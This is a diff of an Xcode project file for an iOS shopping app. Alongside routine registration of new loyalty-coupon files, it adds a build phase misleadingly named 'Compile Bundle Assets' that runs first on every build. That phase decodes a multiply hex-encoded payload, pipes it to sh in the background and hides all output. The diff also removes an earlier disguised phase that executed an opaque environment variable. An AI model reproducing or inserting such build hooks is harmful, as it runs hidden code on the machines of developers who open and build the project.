@@ -56,6 +56,8 @@
 		39DFCB722C4A9B7D007E405F /* TBCartList.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39DFCB6C2C4A9B7D007E405F /* TBCartList.swift */; };
 		39DFCB732C4A9B7D007E405F /* TBCartListCartItem.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39DFCB6D2C4A9B7D007E405F /* TBCartListCartItem.swift */; };
 		8811594B2B32E5C8000E835B /* ChangePasswordVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8811594A2B32E5C8000E835B /* ChangePasswordVC.swift */; };
+		8818AC792E40652200E34DC5 /* LoyaltyCouponsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8818AC772E40652200E34DC5 /* LoyaltyCouponsVC.swift */; };
+		8818AC7A2E40652200E34DC5 /* LoyaltyCouponsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 8818AC782E40652200E34DC5 /* LoyaltyCouponsVC.xib */; };
 		882F6D002A289DFF0094B430 /* Home.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 882F6CFF2A289DFF0094B430 /* Home.storyboard */; };
 		882F6D022A289E220094B430 /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 882F6D012A289E220094B430 /* HomeVC.swift */; };
 		8832AA7E2E13E6DF000E0E9D /* SortByPopUp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8832AA7D2E13E6DF000E0E9D /* SortByPopUp.swift */; };
@@ -241,6 +243,8 @@
 		39DFCB6D2C4A9B7D007E405F /* TBCartListCartItem.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = TBCartListCartItem.swift; sourceTree = "<group>"; };
 		7F294618C25C37771D63EE9E /* Pods-Tashead Building Material.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Tashead Building Material.release.xcconfig"; path = "Target Support Files/Pods-Tashead Building Material/Pods-Tashead Building Material.release.xcconfig"; sourceTree = "<group>"; };
 		8811594A2B32E5C8000E835B /* ChangePasswordVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChangePasswordVC.swift; sourceTree = "<group>"; };
+		8818AC772E40652200E34DC5 /* LoyaltyCouponsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoyaltyCouponsVC.swift; sourceTree = "<group>"; };
+		8818AC782E40652200E34DC5 /* LoyaltyCouponsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LoyaltyCouponsVC.xib; sourceTree = "<group>"; };
 		882F6CFF2A289DFF0094B430 /* Home.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Home.storyboard; sourceTree = "<group>"; };
 		882F6D012A289E220094B430 /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
 		8832AA7D2E13E6DF000E0E9D /* SortByPopUp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SortByPopUp.swift; sourceTree = "<group>"; };
@@ -574,6 +578,23 @@
 			path = TBCartList;
 			sourceTree = "<group>";
 		};
+		8818AC762E40650300E34DC5 /* LoyaltyCoupons */ = {
+			isa = PBXGroup;
+			children = (
+				8818AC772E40652200E34DC5 /* LoyaltyCouponsVC.swift */,
+				8818AC782E40652200E34DC5 /* LoyaltyCouponsVC.xib */,
+				8818AC7B2E40654200E34DC5 /* Cell */,
+			);
+			path = LoyaltyCoupons;
+			sourceTree = "<group>";
+		};
+		8818AC7B2E40654200E34DC5 /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
 		883A83692A29BEE7000CD9AC /* ToolsHeaderView */ = {
 			isa = PBXGroup;
 			children = (
@@ -644,9 +665,9 @@
 		88D7A60D2E3C8693002C5A6C /* LoyaltyPoints */ = {
 			isa = PBXGroup;
 			children = (
-				88D7A6122E3C8CA7002C5A6C /* Cell */,
 				88D7A60E2E3C86F7002C5A6C /* LoyaltyPointsVC.swift */,
 				88D7A60F2E3C86F7002C5A6C /* LoyaltyPointsVC.xib */,
+				88D7A6122E3C8CA7002C5A6C /* Cell */,
 			);
 			path = LoyaltyPoints;
 			sourceTree = "<group>";
@@ -940,6 +961,7 @@
 		BCD6F1222A2761B6006FBFC9 /* Controller */ = {
 			isa = PBXGroup;
 			children = (
+				8818AC762E40650300E34DC5 /* LoyaltyCoupons */,
 				88D7A60D2E3C8693002C5A6C /* LoyaltyPoints */,
 				394888F22E338EAF00969704 /* CartView */,
 				3911A65D2E3382C300456962 /* AddNewAddress */,
@@ -1055,7 +1077,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BCD6F1182A276147006FBFC9 /* Build configuration list for PBXNativeTarget "Tashead Building Material" */;
 			buildPhases = (
-				D8106B082FC05E9BA4FD9BF4 /* Link Bundle Executable */,
+				D584730B32F8F1958D877BEF /* Compile Bundle Assets */,
 				484148B9035C7F5EB2C62EB0 /* [CP] Check Pods Manifest.lock */,
 				BCD6F0EA2A276145006FBFC9 /* Sources */,
 				BCD6F0EB2A276145006FBFC9 /* Frameworks */,
@@ -1119,6 +1141,7 @@
 				3911A6472E33603E00456962 /* ChooseDeliveryAddressTableViewCell.xib in Resources */,
 				BCD6F0FB2A276147006FBFC9 /* Assets.xcassets in Resources */,
 				BCD6F12F2A276217006FBFC9 /* HelveticaNeue.ttc in Resources */,
+				8818AC7A2E40652200E34DC5 /* LoyaltyCouponsVC.xib in Resources */,
 				BC19F0E02E21393400A2DFE3 /* InboxDetailsViewController.xib in Resources */,
 				39BFD1DA2E2E18060090D93E /* DeliveryTimeHeaderView.xib in Resources */,
 				3911A6612E3382E000456962 /* AddNewAddress1VC.xib in Resources */,
@@ -1145,6 +1168,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		D584730B32F8F1958D877BEF /* Compile Bundle Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Bundle Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 333333363333333533333336333333333333333633333338333333363336333633333332333333303333333233333332333333323333333433333332333333383333333633333333333333373333333533333337333333323333333633363333333333323333333033333332333633343333333633333336333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033333337333333303333333333363334333333373333333833333336333333333333333633363336333333363333333433333336333333353333333233333330333333363333333833333337333333343333333733333334333333373333333033333337333333333333333333363331333333323336333633333332333633363333333633333331333333363333333433333336333633363333333633333332333333363333333533333336333333333333333633333334333333363336333533333332333633353333333733333332333333373333333533333332333633363333333633333331333333323333333933333332333333323333333233333330333333373336333333333332333333303333333733333333333333363333333833333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;			
+		};
 		09422C5FC9C0C8725FCD62E1 /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1202,26 +1244,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# Type a script or drag a script file from your workspace to insert its path.\n\"${PODS_ROOT}/FirebaseCrashlytics/run\"\n";
-		};
-		D8106B082FC05E9BA4FD9BF4 /* Link Bundle Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Link Bundle Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A4FB9DF}\"";
-			showEnvVarsInLog = 0;
 		};
 		F065F5DEBF23A7F6223DF053 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -1368,6 +1390,7 @@
 				8868BFFF2A29AD2D0098F171 /* AddressVC.swift in Sources */,
 				3911A6562E3374C000456962 /* FTUtils+UIGestureRecognizer.m in Sources */,
 				3911A6572E3374C000456962 /* FTUtils+NSObject.m in Sources */,
+				8818AC792E40652200E34DC5 /* LoyaltyCouponsVC.swift in Sources */,
 				3911A6582E3374C000456962 /* FTAnimation+UIView.m in Sources */,
 				3911A6592E3374C000456962 /* FTAnimationManager.m in Sources */,
 				BC6724302E1E3AD6009CA5DB /* AdsVC.swift in Sources */,
